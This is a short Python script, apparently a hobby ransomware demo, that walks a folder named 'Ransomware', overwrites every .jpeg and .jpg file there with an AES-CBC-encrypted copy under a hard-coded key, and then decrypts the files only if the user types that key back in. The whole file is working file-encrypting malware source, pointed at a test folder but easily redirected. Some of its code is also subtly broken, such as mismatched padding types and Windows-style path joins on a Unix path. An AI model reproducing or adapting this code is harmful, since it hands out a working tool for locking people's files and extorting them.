from email.utils import encode_rfc2231
import os
import hashlib
from Crypto import Random
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
import time

time.clock = time.time

class AESCipher(object):
    def __init__(self, key):
        self.block_size = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, plain_text):
        plain_text = self.__pad(plain_text)
        iv = Random.new().read(self.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        encrypted_text = cipher.encrypt(plain_text)
        return b64encode(iv + encrypted_text).decode("utf-8")

    def decrypt(self, encrypted_text):
        encrypted_text = b64decode(encrypted_text)
        iv = encrypted_text[:self.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        plain_text = cipher.decrypt(encrypted_text[self.block_size:])
        return self.__unpad(plain_text)

    def __pad(self, plain_text):
        number_of_bytes_to_pad = self.block_size - len(plain_text) % self.block_size
        ascii_string = chr(number_of_bytes_to_pad)
        padding_str = number_of_bytes_to_pad * ascii_string
        padded_plain_text = plain_text + bytes(padding_str,'utf-8')
        return padded_plain_text

    @staticmethod
    def __unpad(plain_text):
        last_character = plain_text[len(plain_text) - 1:]
        return plain_text[:-ord(last_character)]

key="myKey"      
aes=AESCipher(key)
encryption_ext=('.jpeg','.jpg')
file_paths=[]
def decryption():
    file_path=[]
    for root, dirs, files in os.walk('/Users/shashank/Ransomware'):
        for file in files:
            file_path,file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encryption_ext:
                filep=open(os.path.join(root,file),"rb")
                out1=aes.decrypt(filep.read())
                open(os.path.join(root,file), "wb").write(out1)


for root, dirs, files in os.walk('/Users/shashank/Ransomware'):
    for file in files:
        file_paths, file_ext = os.path.splitext(root+'\\'+file)
        if file_ext in encryption_ext:
            print(file)
            fileq=open(os.path.join(root,file),"rb")
            out=aes.encrypt(fileq.read())
            open(os.path.join(root,file), "wb").write(bytes(out,'utf-8'))

Key=input("Enter the key to decrypt: ")
if Key==key:
    decryption()
